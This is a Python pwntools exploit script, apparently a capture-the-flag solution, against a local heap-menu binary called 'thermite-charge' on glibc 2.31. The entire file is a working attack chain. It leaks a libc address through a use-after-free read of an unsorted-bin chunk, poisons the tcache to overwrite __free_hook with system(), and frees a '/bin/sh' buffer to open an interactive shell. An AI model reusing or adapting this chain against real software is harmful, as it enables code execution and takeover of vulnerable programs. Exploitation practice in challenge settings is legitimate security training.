from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

libc = ELF('./libc-2.31.so', checksec=False)

FREE_HOOK = libc.symbols['__free_hook']
SYSTEM = libc.symbols['system']
UNSORTED_BIN_OFFSET = 0x1ecbe0 

p = process(['./ld-2.31.so', '--library-path', '.', './thermite-charge'])


def menu():
    p.recvuntil(b'> ')


def plant(slot, size, payload):
    menu()
    p.sendline(b'1')
    p.recvuntil(b'slot (0-15): ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'payload: ')
    p.send(payload)


def defuse(slot):
    menu()
    p.sendline(b'2')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())


def rewire(slot, payload):
    menu()
    p.sendline(b'3')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'new payload: ')
    p.send(payload)


def inspect(slot, size):
    menu()
    p.sendline(b'4')
    p.recvuntil(b'slot: ')
    p.sendline(str(slot).encode())
    p.recvuntil(b'payload: ')
    return p.recvn(size)

plant(0, 0x420, b'A' * 0x420)
plant(1, 0x20, b'B' * 0x20)
defuse(0) 
leaked = inspect(0, 0x420)
leak = u64(leaked[:8])
libc.address = leak - UNSORTED_BIN_OFFSET
free_hook = libc.address + FREE_HOOK
system_addr = libc.address + SYSTEM

plant(2, 0x18, b'C' * 0x18)
plant(3, 0x18, b'E' * 0x18)
defuse(2)                           
defuse(3)                                  
rewire(3, p64(free_hook) + b'\x00' * 0x10)  
plant(4, 0x18, b'F' * 0x18)                
plant(5, 8, p64(system_addr))     
plant(6, 8, b'/bin/sh\x00')
defuse(6) 

p.sendline(b'yeeey')
p.interactive()